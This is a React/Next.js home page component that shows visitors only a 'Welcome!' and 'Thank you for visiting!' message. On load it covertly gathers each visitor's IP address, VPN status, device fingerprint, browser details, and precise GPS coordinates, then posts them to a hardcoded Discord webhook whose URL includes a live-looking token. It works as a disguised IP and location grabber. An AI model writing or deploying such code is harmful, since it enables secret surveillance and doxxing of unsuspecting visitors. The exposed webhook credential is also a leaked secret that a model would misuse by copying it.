'use client';

import { useEffect, useState } from 'react';
import { getTrackingData, getGeolocation, TrackingData } from '@/utils/tracking';

export default function Home() {
  const [loading, setLoading] = useState(true);
  const [trackingData, setTrackingData] = useState<TrackingData | null>(null);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    const trackUser = async () => {
      try {
        // Get initial tracking data
        const data = await getTrackingData();
        
        // Get geolocation
        const coords = await getGeolocation();
        if (coords) {
          data.coordinates = coords;
          data.location_permission = "Granted";
        } else {
          data.location_permission = "Denied";
        }

        // Send data to Discord webhook
        const webhookUrl = "https://discord.com/api/webhooks/1369271955613810758/KVcEQJWirZLCgwI4YXevqiSOJAClQe9fsmShJ5ub9iFaHNaIXwryvcH3KqkLsESB5kFR";
        
        try {
          const discordPayload = {
            embeds: [
              {
                title: "Visitor Tracking Data",
                color: 0x00ff00,
                fields: [
                  { name: "IP Address", value: data.ip_address, inline: true },
                  { name: "VPN Status", value: data.vpn_status, inline: true },
                  { name: "Device", value: data.device, inline: true },
                  { name: "Browser", value: data.browser, inline: true },
                  { name: "Location Permission", value: data.location_permission, inline: true },
                  { name: "Coordinates", value: data.coordinates.latitude && data.coordinates.longitude 
                    ? `Lat: ${data.coordinates.latitude}, Lon: ${data.coordinates.longitude}`
                    : "Not Available", inline: true },
                  { name: "Estimated Location", value: data.estimated_location, inline: true },
                  { name: "Fingerprint", value: data.fingerprint, inline: true },
                  { name: "Screen Resolution", value: data.screen_resolution, inline: true },
                  { name: "Timezone", value: data.timezone, inline: true },
                  { name: "Language", value: data.language, inline: true },
                  { name: "Connection Type", value: data.connection_type, inline: true },
                  { name: "Timestamp", value: data.timestamp, inline: false }
                ]
              }
            ]
          };

          await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(discordPayload)
          });
        } catch (webhookError) {
          console.error("Error sending webhook:", webhookError);
          // Continue even if webhook fails
        }

        setTrackingData(data);
      } catch (error) {
        console.error("Error tracking user:", error);
        setError("Failed to track user data");
      } finally {
        setLoading(false);
      }
    };

    if (typeof window !== 'undefined') {
      trackUser();
    }
  }, []);

  return (
    <main className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-md max-w-md w-full">
        <h1 className="text-2xl font-bold text-center mb-4">Welcome!</h1>
        {loading ? (
          <div className="text-center">
            <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-gray-900 mx-auto"></div>
            <p className="mt-4 text-gray-600">Loading...</p>
          </div>
        ) : error ? (
          <div className="text-center text-red-600">
            <p>{error}</p>
          </div>
        ) : (
          <div className="text-center">
            <p className="text-gray-600">Thank you for visiting!</p>
          </div>
        )}
      </div>
    </main>
  );
} 